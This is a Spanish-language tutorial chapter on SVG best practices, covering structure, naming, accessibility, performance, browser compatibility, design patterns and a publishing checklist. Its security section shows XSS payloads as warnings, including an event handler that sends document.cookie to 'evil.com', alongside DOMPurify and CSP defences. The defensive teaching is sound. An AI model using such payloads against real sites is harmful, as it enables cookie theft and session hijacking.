# Seccion 25: Buenas Practicas y Patrones Comunes

> Las buenas practicas en SVG no son reglas arbitrarias: cada una tiene una razon concreta
> relacionada con el rendimiento, la accesibilidad, la mantenibilidad o la seguridad.
> Esta seccion es la sintesis de todo lo aprendido aplicado a produccion real.

---

## 25.1 Estructura y organizacion del codigo SVG

### El orden recomendado dentro de un SVG

```xml
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">

  <!-- 1. Bloque de estilos (si es SVG standalone o inline con mucho CSS) -->
  <style>
    :root { --color-principal: steelblue; }
    .fondo { fill: #f5f5f5; }
  </style>

  <!-- 2. Definiciones reutilizables -->
  <defs>
    <linearGradient id="grad-principal">...</linearGradient>
    <clipPath id="recorte">...</clipPath>
    <symbol id="icon-close" viewBox="0 0 24 24">...</symbol>
  </defs>

  <!-- 3. Contenido visual, de fondo a frente -->
  <rect class="fondo" width="100" height="100" />
  <g id="contenido-principal">
    <!-- elementos en orden logico -->
  </g>

</svg>
```

**Por que este orden:**
- Los navegadores parsean el SVG de arriba a abajo
- Los elementos deben estar definidos en `<defs>` antes de ser referenciados
- El orden visual de los elementos determina el z-order (los ultimos se pintan encima)

### Reglas de organizacion

**Siempre usar `viewBox`**
- Sin viewBox, el SVG no es escalable responsivamente
- El viewBox define el sistema de coordenadas interno, independiente del tamano de renderizado
- `viewBox="0 0 W H"` donde W y H son las dimensiones logicas del diseno

**Todo lo reutilizable va en `<defs>`**
- Gradientes, patrones, filtros, clipPaths, masks, symbols, markers
- Los elementos en `<defs>` son invisibles hasta que se referencian con `url()` o `<use>`

**Agrupar con `<g>` lo que pertenece junto**
- No solo por estetica: los grupos permiten aplicar transformaciones, filtros y estilos a varios elementos a la vez
- Un grupo sin atributos que envuelve un solo elemento no aporta nada — eliminarlo

**Coordenadas relativas al viewBox**
- En vez de coordenadas absolutas de pantalla, usar valores que tengan sentido en el sistema de coordenadas del viewBox
- `cx="50"` en un `viewBox="0 0 100 100"` significa "centro horizontal" — eso es legible
- `cx="324.5"` en el mismo viewBox no tiene un significado obvio

### Comentarios en SVG

```xml
<!-- Seccion: navegacion -->
<g id="nav-icons">
  <!-- Icono de inicio -->
  <use href="#icon-home" x="10" y="10" />
  <!-- Icono de busqueda -->
  <use href="#icon-search" x="40" y="10" />
</g>
```

- Los comentarios XML (`<!-- -->`) son perfectamente validos en SVG
- Usar para marcar secciones en SVGs complejos
- SVGO los elimina automaticamente con `removeComments` — aceptable en produccion
- Si se necesitan comentarios en el SVG publicado, desactivar ese plugin

---

## 25.2 Nombrado y semantica

### IDs descriptivos y funcionales

| Mal | Bien |
|-----|------|
| `id="path4532"` (generado por editor) | `id="contorno-logo"` |
| `id="g1"` | `id="grupo-navegacion"` |
| `id="Layer_1"` | `id="capa-fondo"` |
| `id="a"` (optimizado por SVGO) | Dejar SVGO acortar solo cuando no se usa en JS/CSS |

**Regla:** si el ID es referenciado desde JavaScript o CSS externo, debe ser descriptivo. Si es solo interno al SVG (para `url(#id)` dentro del mismo SVG), puede ser corto.

### Convencion de nombres

**Para IDs que se referencian externamente:**
- `kebab-case` — consistente con clases CSS: `icon-home`, `grad-fondo`, `clip-avatar`
- Prefijo por tipo: `icon-`, `grad-`, `clip-`, `mask-`, `filter-`

**Para clases CSS:**
- Igual que en HTML: `.icono`, `.activo`, `.etiqueta`
- BEM si el proyecto lo usa: `.card__icono`, `.btn--primario`

**IDs invalidos:**
- No pueden empezar con un numero: `2xl-icon` — invalido
- No pueden contener espacios: `mi icono` — invalido
- Pueden contener guiones y guiones bajos

### Semantica: `<title>` y `<desc>`

**Para SVG como imagen con significado:**
```xml
<svg viewBox="0 0 100 100" role="img" aria-labelledby="titulo-grafico desc-grafico">
  <title id="titulo-grafico">Distribucion de ventas por region</title>
  <desc id="desc-grafico">
    Grafico de tarta que muestra las ventas: Norte 35%, Sur 25%, Este 40%.
  </desc>
  <!-- contenido visual -->
</svg>
```

**Para SVG decorativo (icono que acompana texto):**
```xml
<svg aria-hidden="true" focusable="false">
  <!-- no necesita title ni desc -->
</svg>
```

---

## 25.3 Rendimiento

### El numero de nodos como metrica clave

Cada elemento SVG es un nodo del DOM. Los nodos tienen un costo:
- Tiempo de parseo (leer el HTML/SVG)
- Tiempo de layout (calcular posiciones)
- Tiempo de pintura (renderizar en pantalla)
- Memoria (cada nodo ocupa memoria)

**Umbrales practicos:**
- < 100 elementos: sin preocupaciones
- 100 - 1000 elementos: rendimiento generalmente bueno en desktop
- > 1000 elementos: empezar a medir y considerar optimizaciones
- > 5000 elementos: considerar seriamente Canvas o WebGL

**Como reducir nodos:**
- Combinar paths con el mismo estilo en un unico path con sub-trazados (`M ... M ...`)
- Usar `<use>` para elementos repetidos en lugar de copiar el SVG N veces
- Eliminar grupos vacios y grupos que solo tienen un hijo sin atributos

### Filtros y su costo

Los filtros SVG son los elementos mas costosos en terminos de rendimiento porque:
1. Requieren rasterizar el elemento (convertir el vector a bitmap)
2. Procesar cada pixel del area del filtro
3. En pantallas Retina: 4x mas pixels → 4x mas trabajo

**Reglas para filtros:**
- No animar elementos con filtros costosos (blur, turbulence, displacement)
- Si se necesita sombra, preferir CSS `filter: drop-shadow()` — el navegador puede acelerarlo por GPU
- Para desenfoque, CSS `filter: blur()` es mas eficiente que `<feGaussianBlur>`
- Si se necesita `<feGaussianBlur>`, mantener `stdDeviation` lo mas bajo posible

### Animaciones con buen rendimiento

**Propiedades GPU-aceleradas (animar libremente):**
- `transform` (translate, rotate, scale)
- `opacity`

**Propiedades que fuerzan recalculo (evitar animar):**
- `d` (datos del path) — fuerza reparseo del path
- `fill`, `stroke` — en algunos navegadores fuerza repintura
- `stroke-width` — afecta el layout
- `width`, `height`, `x`, `y` en shapes — afectan el layout

**CSS vs JavaScript para animaciones:**
- CSS transitions/animations: el navegador puede optimizarlas mejor (off-thread)
- JavaScript + requestAnimationFrame: mas control, pero corre en el hilo principal
- GSAP: optimiza internamente para minimizar el impacto en el hilo principal

**`will-change` con moderacion:**
```css
/* Activar solo cuando la animacion esta a punto de comenzar */
.elemento { will-change: transform; }

/* Desactivar cuando termina */
.elemento.animacion-completa { will-change: auto; }
```
- Cada elemento con `will-change` activo consume memoria GPU adicional
- No aplicar a todo el SVG como precaucion

### Lazy loading de SVGs pesados

Para SVGs que no son criticos para el primer render:
```html
<!-- SVG como imagen con lazy loading nativo -->
<img src="ilustracion-compleja.svg" loading="lazy" alt="..." />

<!-- SVG inline con Intersection Observer -->
<div data-svg-src="/svg/mapa-interactivo.svg" class="svg-lazy">
  <!-- el SVG se inserta cuando el contenedor es visible -->
</div>
```

---

## 25.4 Compatibilidad entre navegadores

### Soporte moderno (Chrome, Firefox, Safari, Edge)

La mayoria de las caracteristicas SVG estan bien soportadas en navegadores modernos:
- Formas basicas, paths, texto: soporte completo
- Gradientes y patrones: soporte completo
- Filtros: soporte completo (con diferencias menores en algunos filtros avanzados)
- Animaciones CSS en SVG: soporte completo
- SMIL: soportado en Chrome, Firefox, Safari (pero marcado como deprecado en Chrome)
- Variables CSS en SVG: soporte completo

### IE11 (soporte legacy — si es necesario)

IE11 tiene limitaciones significativas con SVG:

| Caracteristica | IE11 | Solucion |
|---------------|------|----------|
| `href` en `<use>` | No soporta | Usar `xlink:href` |
| `<use>` con archivo externo | No soporta | Inline el sprite, o usar `svg4everybody` |
| SVG responsivo sin width/height | Problematico | Incluir `width` y `height` explicitos |
| Variables CSS (`--var`) | No soporta | Hardcodear valores |
| SVG 2 (`href` simple, `paint-order`, etc.) | No soporta | Usar SVG 1.1 |
| `clip-path` CSS | Limitado | Usar atributo `clip-path` SVG |

**Si se necesita soporte IE11:**
- Usar `xlink:href="..."` en lugar de `href="..."` en `<use>`
- Incluir siempre `width` y `height` en el elemento `<svg>` raiz
- Evitar variables CSS
- Evitar SMIL (no soportado por IE11 en absoluto)
- Usar `svg4everybody` como polyfill para sprites externos

### Diferencias entre navegadores a tener en cuenta

**Texto SVG:**
- El renderizado de fuentes puede variar entre navegadores/SO
- `font-kerning`, `text-rendering` pueden dar resultados distintos

**Filtros:**
- `feColorMatrix` con `type="hueRotate"` puede tener ligeras diferencias de implementacion
- Las regiones de filtro (x, y, width, height del `<filter>`) se calculan ligeramente distinto

**SMIL:**
- Chrome ha discutido deprecar SMIL multiples veces pero sigue soportado
- Para produccion, preferir animaciones CSS o JavaScript sobre SMIL

### Estrategia de fallback

**Para SVG en `<img>` sin soporte:**
```html
<!-- Fallback a PNG si SVG no es soportado (navegadores muy antiguos) -->
<picture>
  <source type="image/svg+xml" srcset="logo.svg">
  <img src="logo.png" alt="Logo">
</picture>
```

**Para SVG inline con caracteristicas avanzadas:**
```css
/* Detectar soporte con @supports */
@supports not (clip-path: polygon(0 0)) {
  .elemento { /* fallback */ }
}
```

---

## 25.5 Seguridad

### SVG es codigo, no solo una imagen

A diferencia de PNG o JPEG, un SVG es un documento XML que puede contener:
- `<script>` — JavaScript ejecutable
- Event handlers como atributos: `onclick`, `onload`, `onmouseover`
- `<a href="javascript:...">` — links con JavaScript
- `<foreignObject>` — HTML arbitrario embebido en el SVG
- Referencias a recursos externos: `xlink:href="http://..."`, `filter="url(http://...)"`

### Vectores de ataque XSS via SVG

**Script directo:**
```xml
<!-- Peligroso si se muestra inline sin sanitizar -->
<svg>
  <script>alert('XSS')</script>
</svg>
```

**Event handler en atributo:**
```xml
<circle onload="fetch('https://evil.com?cookie='+document.cookie)" />
<rect onclick="malicious()" />
```

**foreignObject con HTML:**
```xml
<foreignObject>
  <div xmlns="http://www.w3.org/1999/xhtml">
    <img src="x" onerror="alert('XSS')" />
  </div>
</foreignObject>
```

### Metodos de uso y su nivel de seguridad

| Metodo | Scripts ejecutan | Riesgo XSS | Uso seguro para SVG de terceros |
|--------|-----------------|------------|--------------------------------|
| `<img src="...svg">` | No | Ninguno | Si |
| `background-image: url(...)` | No | Ninguno | Si |
| `<object>` / `<embed>` | Si | Medio (aislado) | Con cuidado |
| SVG inline en HTML | Si | Alto | No sin sanitizar |
| `<iframe>` | Si (aislado) | Bajo (sandbox) | Con sandbox |

**Regla de oro:** nunca mostrar SVG de fuentes no confiables (uploads de usuarios, SVG de terceros no verificados) como inline sin sanitizar.

### Sanitizacion de SVG

**DOMPurify** es la libreria de referencia para sanitizar SVG en el cliente:
```javascript
import DOMPurify from 'dompurify';

// Configuracion especifica para SVG
const svgLimpio = DOMPurify.sanitize(svgString, {
  USE_PROFILES: { svg: true, svgFilters: true },
  FORBID_TAGS: ['script', 'foreignObject'],
  FORBID_ATTR: ['onload', 'onclick', 'onerror']
});

// Insertar el SVG limpio
elemento.innerHTML = svgLimpio;
```

**En el servidor:**
- Validar que el archivo subido sea realmente SVG antes de procesarlo
- Usar herramientas de sanitizacion del lado del servidor (equivalentes a DOMPurify en Python, Ruby, etc.)
- No confiar en la extension del archivo o el MIME type reportado por el cliente

### Content Security Policy (CSP) para SVG

Si la aplicacion sirve SVG con posibles scripts:
```
Content-Security-Policy: default-src 'self'; img-src 'self' data:; script-src 'self'
```

Esto impide que scripts externos (o inline no autorizados) se ejecuten, incluso si logran estar en el SVG.

---

## 25.6 Patrones de diseno comunes

### Patron: Spinner/Loader animado

El patron clasico de indicador de carga:
- Un circulo con `stroke-dasharray` para hacer el arco parcial
- `stroke-dashoffset` animado para dar la impresion de movimiento
- Rotacion continua del grupo completo

**Componentes necesarios:**
- `<circle>` con `fill="none"` y solo `stroke`
- `stroke-dasharray` = longitud de la circunferencia del circulo
- Animacion CSS de `rotate` + animacion de `stroke-dashoffset`

### Patron: Progress Bar

Barra de progreso usando `stroke-dashoffset`:
- `<line>` o `<rect>` de ancho total
- Sobre ella, una `<line>` o `<rect>` de color que representa el progreso
- Alternativa elegante: `<path>` con `stroke-dashoffset` animado

**Con JavaScript para progreso dinamico:**
- Calcular la longitud del path con `path.getTotalLength()`
- Ajustar `stroke-dashoffset` = longitud × (1 - porcentaje)
- Animar el cambio con CSS transition o GSAP

### Patron: Icono con estado

Icono que cambia visualmente segun el estado (activo/inactivo, lleno/vacio):

```xml
<symbol id="icon-heart" viewBox="0 0 24 24">
  <!-- Contorno siempre visible -->
  <path class="contorno" d="M12 21.35..." />
  <!-- Relleno que aparece cuando esta activo -->
  <path class="relleno" d="M12 21.35..." />
</symbol>
```

```css
.icon-heart .relleno { opacity: 0; transition: opacity 0.2s; }
.activo .icon-heart .relleno { opacity: 1; }
```

### Patron: Mapa interactivo

SVG como mapa geografico con regiones interactivas:
- Cada region es un `<path>` con un `id` correspondiente a la region
- CSS `:hover` para el estado de hover
- JavaScript para eventos click, tooltip, cambio de estado
- Datos externos vinculados a los IDs de los paths

**Estructura:**
```xml
<svg viewBox="0 0 ...">
  <g id="regiones">
    <path id="region-norte" class="region" data-nombre="Norte" d="..." />
    <path id="region-sur" class="region" data-nombre="Sur" d="..." />
  </g>
  <g id="etiquetas" aria-hidden="true">
    <!-- textos de etiquetas -->
  </g>
</svg>
```

### Patron: Logo responsivo

Un SVG que muestra diferentes versiones segun el espacio disponible usando media queries internas:

```xml
<svg viewBox="0 0 200 60">
  <style>
    /* Logotipo completo por defecto */
    .logo-completo { display: block; }
    .logo-compacto { display: none; }

    /* Solo isotipo (icono) para espacios pequenos */
    @media (max-width: 200px) {
      .logo-completo { display: none; }
      .logo-compacto { display: block; }
    }
  </style>
  <g class="logo-completo">
    <!-- Logo completo con texto e icono -->
  </g>
  <g class="logo-compacto">
    <!-- Solo el icono -->
  </g>
</svg>
```

**Nota:** las media queries dentro de SVG se basan en el viewport del documento (o del contenedor en algunos navegadores), no en el tamano del propio SVG.

### Patron: Texto decorativo en path curvo

```xml
<svg viewBox="0 0 200 100">
  <defs>
    <path id="curva-texto" d="M 20,60 Q 100,10 180,60" />
  </defs>
  <text font-size="14" fill="steelblue">
    <textPath href="#curva-texto">Texto en curva</textPath>
  </text>
</svg>
```

**Variaciones:**
- Texto alrededor de un circulo: path circular como guia
- Texto en ola: path sinusoidal
- El path guia puede ser invisible (sin fill ni stroke)

### Patron: Grafico de datos simple

Para graficos simples sin librerias externas:
- Barras verticales: `<rect>` con altura proporcional al valor
- Etiquetas: `<text>` con `text-anchor="middle"` sobre cada barra
- Eje: `<line>` horizontal en la base
- Escala: calcular height = (valor / valorMaximo) × alturaDisponible

**Con JavaScript para datos dinamicos:**
```javascript
const datos = [30, 70, 45, 90, 60];
const alturaMax = 100;
const anchoBarra = 15;

datos.forEach((valor, i) => {
  const rect = document.createElementNS('http://www.w3.org/2000/svg', 'rect');
  rect.setAttribute('x', i * (anchoBarra + 5));
  rect.setAttribute('y', alturaMax - valor);
  rect.setAttribute('width', anchoBarra);
  rect.setAttribute('height', valor);
  svg.appendChild(rect);
});
```

---

## 25.7 Checklist antes de publicar

### Estructura y escalabilidad

- [ ] `viewBox` definido correctamente (cubre todo el contenido)
- [ ] No hay `width` y `height` fijos si el SVG debe ser responsivo (o estan definidos como porcentaje)
- [ ] El contenido visual cabe dentro del viewBox (nada cortado)
- [ ] Todos los elementos referenciados tienen IDs validos

### Accesibilidad

- [ ] SVG decorativo: tiene `aria-hidden="true"` y `focusable="false"`
- [ ] SVG con significado: tiene `role="img"`, `<title>`, y opcionalmente `<desc>`
- [ ] Iconos en botones sin texto: el boton tiene `aria-label`
- [ ] El contraste de colores es suficiente (WCAG AA: ratio minimo 4.5:1 para texto)

### Optimizacion

- [ ] Procesado con SVGO (o SVGOMG para verificar visualmente)
- [ ] Sin metadatos del editor (Inkscape, Illustrator, Figma)
- [ ] Decimales de coordenadas reducidos (1-2 para iconos, max 3 para ilustraciones)
- [ ] IDs acortados si no se referencian externamente
- [ ] Grupos vacios eliminados

### Colores y estilos

- [ ] Usar `currentColor` donde el icono debe heredar el color del contexto
- [ ] Variables CSS definidas si el SVG necesita tematizacion
- [ ] No hay estilos inline (`style="..."`) que impidan la tematizacion futura (a menos que sea intencional)

### Seguridad

- [ ] Si el SVG viene de fuentes externas: ha pasado por un sanitizador
- [ ] No contiene `<script>`, event handlers (`onclick`, `onload`), ni `<foreignObject>` no confiable
- [ ] Si se sirve como archivo externo: tiene `Content-Type: image/svg+xml` correcto

### Rendimiento

- [ ] Numero de elementos SVG razonable (< 1000 para uso general)
- [ ] No hay filtros costosos en elementos animados
- [ ] Las animaciones usan `transform` y `opacity` (propiedades GPU-aceleradas)
- [ ] El servidor tiene gzip o brotli habilitado para `image/svg+xml`

### Compatibilidad

- [ ] Probado en Chrome, Firefox y Safari (minimo)
- [ ] Si se necesita IE11: usa `xlink:href` en `<use>`, tiene `width`/`height` explicitos
- [ ] `<use>` con sprite externo: verificar que no hay problemas de CORS

### Integracion

- [ ] El metodo de integracion es el correcto para el caso de uso (inline, `<img>`, sprite, componente)
- [ ] Si es inline: no hay conflictos de IDs con otros SVGs en la misma pagina
- [ ] Si es `<img>`: los scripts no se ejecutan (comportamiento esperado y seguro)
- [ ] Cache-Control configurado correctamente para SVGs con nombre hasheado

---

## 25.8 Guia de decision rapida

### Cuándo usar SVG vs otras opciones

| Caso | Recomendacion |
|------|--------------|
| Icono monocromo | SVG (`currentColor`) |
| Icono multicolor | SVG (con variables CSS si necesita tematizacion) |
| Logo de empresa | SVG (escalabilidad perfecta) |
| Fotografia | JPEG/WebP — no SVG |
| Ilustracion muy compleja y fotografica | PNG/WebP — no SVG |
| Grafico de barras con datos dinamicos | SVG + JavaScript (o D3.js) |
| Animacion elaborada de un animador | Lottie |
| Animacion de line-drawing | SVG + Vivus o CSS |
| Fondo decorativo geometrico | SVG o CSS `background` |
| Patron repetido como fondo | `<pattern>` SVG o CSS |
| Visualizacion con miles de elementos | Canvas o WebGL |

### Que aprender despues de este roadmap

Este roadmap cubre SVG a nivel basico-intermedio. Los siguientes pasos para profundizar:

**Nivel avanzado:**
- Filtros de iluminacion SVG (`feDiffuseLighting`, `feSpecularLighting`)
- Animaciones morficas con GSAP (`morphSVG`)
- SVG en Web Components con Shadow DOM
- La especificacion SVG 2 completa (aun en borrador en algunas partes)
- SVG generativo con algoritmos (Voronoi, sistemas de particulas)

**Ecosistema:**
- D3.js en profundidad para visualizacion de datos
- Three.js / WebGL para graficos 3D (mas alla de SVG)
- Canvas API para graficos de alta performance

**Herramientas avanzadas:**
- Configuracion avanzada de SVGO para pipelines de build
- Storybook para documentar sistemas de iconos
- Chromatic para test visual de componentes SVG
